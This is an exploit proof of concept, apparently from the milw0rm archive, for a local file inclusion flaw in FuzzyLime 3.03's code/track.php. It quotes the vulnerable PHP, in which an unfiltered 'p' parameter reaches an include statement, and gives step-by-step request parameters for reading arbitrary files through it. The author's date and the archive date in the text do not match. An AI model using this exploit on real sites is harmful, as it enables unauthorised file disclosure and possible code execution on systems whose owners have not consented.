@@ -1,0 +1,38 @@
+/*
+--+_---=+--=_____=+++++
+
+-- FuzzyLime 3.03 Local File Iclude PoC 
+    ***
+   (-0-)
+  -____======_+++++---''''
+***************************************__________________
+-- Vuln 
+ - code/track.php
+   
+  $m = $_GET[m];
+  $p = $_GET[p]; //1 
+  include "settings.inc.php";
+  if(!isset($_POST[url]) || !isset($_POST[title]) || !isset($_POST[excerpt])) { //2
+	header("Location: ${rooturl}index.php?s=news&p=$p&m=$m");
+  }
+  else {
+    if(file_exists("../blogs/$p.inc.php")) { //3
+	 include "../blogs/$p.inc.php";     //4 
+   ...
+1 $p is not filtered 
+2 When POST'S is set 
+3 and file exists
+4 we have lfi
+
+---+++++....--___________--============
+*/
+
+
+Go to LIVE_HTTP_HEADERS in firefox or opera or whatever
+set url  http://site/path/code/track.php?p=[file] 
+set "SEND POST CONNTENT"  url=evil&title=666&excerpt=xd
+and push reply 
+ 
+//Alfons Luja  25.12.2008
+
+# milw0rm.com [2008-11-25]
